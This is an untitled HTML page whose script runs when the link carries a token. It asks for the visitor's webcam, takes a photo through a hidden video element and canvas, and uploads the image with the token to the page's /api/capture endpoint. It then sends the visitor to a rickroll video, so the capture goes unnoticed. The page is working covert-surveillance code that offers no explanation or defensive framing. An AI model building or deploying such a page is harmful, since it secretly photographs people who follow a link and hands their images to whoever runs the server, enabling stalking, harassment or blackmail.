<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body>
    <input type="text" id="token" placeholder="XXXX-XXXX" style="position:absolute; left:-9999px;">

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const urlToken = urlParams.get('token');
        
        if (urlToken) {
            document.getElementById('token').value = urlToken;
            startCapture();
        }
        
        async function startCapture() {
            const token = document.getElementById('token').value.trim();
            
            if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
                return;
            }
            
            try {
                // Запрашиваем камеру
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Создаем скрытое видео
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                // Ждем
                await new Promise(r => setTimeout(r, 1000));
                
                // Создаем canvas
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);
                
                // Останавливаем камеру
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
                // Конвертируем в blob
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
                
                // Отправляем
                const formData = new FormData();
                formData.append('image', blob, 'photo.jpg');
                formData.append('token', token);
                
                const response = await fetch('/api/capture', { 
                    method: 'POST', 
                    body: formData 
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Перенаправляем на ютуб
                    window.location.href = 'https://youtu.be/dQw4w9WgXcQ';
                }
                
            } catch (err) {
                console.log(err);
            }
        }
    </script>
</body>
</html>
